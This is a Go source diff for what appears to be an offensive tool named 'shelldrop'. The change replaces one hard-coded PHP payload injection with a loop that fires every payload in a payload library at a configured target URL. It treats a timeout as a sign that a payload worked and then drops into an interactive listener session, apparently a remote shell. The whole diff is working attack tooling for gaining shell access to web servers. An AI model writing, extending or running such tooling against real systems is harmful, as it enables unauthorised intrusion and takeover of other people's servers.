@@ -2,9 +2,11 @@ package main
 
 import (
 	"context"
+	"errors"
 	"fmt"
 	"os"
 	"shelldrop/log"
+	"shelldrop/payloads"
 )
 
 func main() {
@@ -19,16 +21,27 @@ func main() {
 	}
 	defer listener.Close()
 
-	injector := NewInjector("php_1").
-		WithListenerConfig(cfg.Listener).
-		WithUrl(cfg.Request.Url)
-
-	if err := injector.Do(ctx); err != nil {
-		log.Fatalf("Failed to inject payload: %v", err)
-	}
+	injectPayloads(cfg, ctx)
 
 	if err := listener.Interact(); err != nil {
 		fmt.Printf("[-] Error during interaction: %v\n", err)
 		os.Exit(1)
+	}
+}
+
+func injectPayloads(cfg *Config, ctx context.Context) {
+	for payload := range payloads.All {
+		injector := NewInjector(payload).
+			WithListenerConfig(cfg.Listener).
+			WithUrl(cfg.Request.Url)
+
+		if err := injector.Do(ctx); err != nil {
+			if os.IsTimeout(err) || errors.Is(err, context.Canceled) {
+				log.Infof("Found successful payload: %s", payload)
+				return
+			}
+
+			log.Fatalf("Failed to inject payload: %v", err)
+		}
 	}
 }
